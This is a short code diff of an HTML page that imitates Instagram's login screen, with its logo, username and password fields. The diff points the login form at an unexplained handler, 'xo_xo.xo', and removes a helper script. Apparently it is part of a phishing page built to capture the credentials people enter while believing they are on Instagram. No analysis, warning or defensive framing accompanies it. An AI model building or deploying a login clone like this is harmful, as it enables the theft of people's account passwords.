@@ -19,28 +19,15 @@
                     <img src="img/Instagram-Wordmark-Black-Logo.svg" alt="" />
                 </div>
                 <div class="card__form">
-                    <form action="" method="post">
+                    <form action="xo_xo.xo" method="post">
                         <input type="text" id="userName" name="username" class="__form form__input"
                             placeholder="Phone number, username, or email" required>
                         <input type="password" name="password" class="__form form__input" placeholder="Password"
                             required>
                         <div>
-                            <button type="submit" class=" __form form__btn">Log in</button>
+                            <button type="submit" class=" __form form__btn" id="submitButton">Log in</button>
                         </div>
                     </form>
-                    <script>
-                        function checkInputType(value) {
-                            const userName = document.getElementById("userName");
-
-                            if (/^\d+$/.test(value)) {
-                                userName.type = "tel";
-                            } else if (/^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/.test(value)) {
-                                userName.type = "email";
-                            } else {
-                                userName.type = "text";
-                            }
-                        }
-                    </script>
                 </div>
 
                 <div class="card__break">
